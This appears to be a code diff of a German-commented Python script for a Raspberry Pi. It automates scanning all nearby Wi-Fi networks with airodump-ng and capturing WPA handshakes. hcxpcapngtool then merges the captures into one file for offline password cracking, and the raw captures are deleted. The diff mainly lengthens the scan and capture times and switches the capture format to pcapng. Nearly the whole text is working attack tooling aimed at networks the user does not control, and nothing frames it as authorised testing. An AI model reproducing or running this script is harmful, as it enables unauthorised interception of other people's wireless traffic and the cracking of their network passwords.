@@ -5,17 +5,17 @@ import glob
 
 INTERFACE = "wlan1"
 HANDSHAKE_DIR = "/home/pi/handshakes"
-SCAN_TIME = 15 # Zeit für Netzwerkscan in Sekunden
-HANDSHAKE_WAIT_TIME = 7  # Zeit für Handshake-Erfassung pro Netzwerk
+SCAN_TIME = 60  # Zeit für Netzwerkscan in Sekunden
+HANDSHAKE_WAIT_TIME = 60  # Zeit für Handshake-Erfassung pro Netzwerk
 
 def setup():
-    # Erstelle das Verzeichnis für die Handshakes, falls es nicht existiert
+    # Handshake-Verzeichnis erstellen, falls es nicht existiert
     os.makedirs(HANDSHAKE_DIR, exist_ok=True)
 
 def scan_networks():
     print("[*] Starte Netzwerkscan...")
     scan_process = subprocess.Popen(
-        ["sudo", "airodump-ng", "--band", "abg", "-w", HANDSHAKE_DIR + "/scan", "--output-format", "csv", INTERFACE],
+        ["sudo", "airodump-ng", "--band", "abg", "-w", HANDSHAKE_DIR + "/scan", "--output-format", "pcapng", INTERFACE],
         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
     )
     time.sleep(SCAN_TIME)
@@ -47,19 +47,19 @@ def capture_handshake(bssid, channel):
 
 def convert_and_cleanup():
     print("[*] Konvertiere und bereinige Dateien...")
-    cap_files = glob.glob(f"{HANDSHAKE_DIR}/*.cap")
+    cap_files = glob.glob(f"{HANDSHAKE_DIR}/*.pcapng")
     if not cap_files:
-        print("[!] Keine .cap-Dateien gefunden.")
+        print("[!] Keine .pcapng-Dateien gefunden.")
         return
-    # Erstelle eine einzige .hccapx Datei aus allen .cap Dateien
+    # Erstelle eine einzige .hccapx Datei aus allen .pcapng Dateien
     hccapx_file = os.path.join(HANDSHAKE_DIR, "handshake.hccapx")
     conversion_cmd = ["hcxpcapngtool", "-o", hccapx_file] + cap_files
     subprocess.call(conversion_cmd)
     print(f"[*] Handshake-Datei erstellt: {hccapx_file}")
-    # Lösche alle .cap-Dateien nach der Konvertierung
+    # Lösche alle .pcapng-Dateien nach der Konvertierung
     for cap_file in cap_files:
         os.remove(cap_file)
-    print("[*] Alle .cap-Dateien wurden gelöscht.")
+    print("[*] Alle .pcapng-Dateien wurden gelöscht.")
 
 def main():
     setup()
